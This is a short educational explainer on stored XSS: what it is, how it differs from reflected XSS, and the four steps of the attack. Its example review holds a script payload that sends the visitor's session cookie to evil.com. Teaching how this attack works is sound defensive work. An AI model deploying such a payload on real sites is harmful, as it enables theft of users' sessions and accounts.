## What is Stored XSS?

**Stored XSS** (also known as **Persistent XSS**) occurs when a malicious script is injected into a target application and
permanently saved in a backend data store—such as a database, message forum, visitor log, or user profile field.

Unlike _Reflected XSS_ (where the malicious payload has to be crafted into a specific URL and clicked by a victim), Stored
XSS is much more dangerous because the victim doesn't need to click a special link. Simply visiting the affected page is
enough to trigger the attack.

---

### How Stored XSS Works

1. **The Injection:** An attacker finds an input field that lacks proper validation or sanitization (e.g., a comment box or a
   user bio). They submit malicious JavaScript code instead of normal text.
2. **The Storage:** The vulnerable application takes the user input and saves it directly into the database without cleaning
   it.
3. **The Delivery:** Later, any other user visits the page containing that stored data. The application fetches the raw
   text—including the hidden script—from the database and sends it to the victim's browser.
4. **The Execution:** The victim's browser renders the response, sees the script tags, and executes the malicious code under
   the victim's session.

---

### Real-World Example

Imagine an online product review system where users can leave comments:

- An attacker submits a review containing a malicious script:
  `Great product! <script>fetch('[https://evil.com/steal?cookie=](https://evil.com/steal?cookie=)' + document.cookie);</script>`
- The server saves this string in the database.
- Every time a regular customer views that product page, the server loads the review, and the browser silently executes the
  script, potentially exposing the customer's session cookies to the attacker.
